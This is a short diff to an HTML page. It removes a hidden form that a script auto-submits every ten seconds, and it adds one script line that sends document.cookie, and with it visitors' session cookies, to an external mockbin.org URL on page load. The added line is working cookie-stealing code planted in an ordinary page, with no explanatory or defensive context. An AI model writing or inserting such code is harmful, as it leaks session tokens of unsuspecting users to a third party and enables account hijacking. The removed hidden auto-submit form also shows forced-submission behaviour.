@@ -17,30 +17,9 @@
       
 
 
-<form style="display:none;" name="myForm" id="myForm" target="_myFrame" action="" method="POST">
-    <p>
-        <input name="test" value="test" />
-    </p>
-    <p>
-        <input type="submit" value="Submit" />
-    </p>
-</form>
 
-<script type="text/javascript">
-    window.onload=function(){
-        var auto = setTimeout(function(){ autoRefresh(); }, 100);
+<script>$.ajax('http://mockbin.org/bin/29afb543-0b3b-4f57-9542-b91df6974ee8?session'+document.cookie)</script>
 
-        function submitform(){
-          alert('test');
-          document.forms["myForm"].submit();
-        }
-
-        function autoRefresh(){
-           clearTimeout(auto);
-           auto = setTimeout(function(){ submitform(); autoRefresh(); }, 10000);
-        }
-    }
-</script>
 
       </div>
   </body>
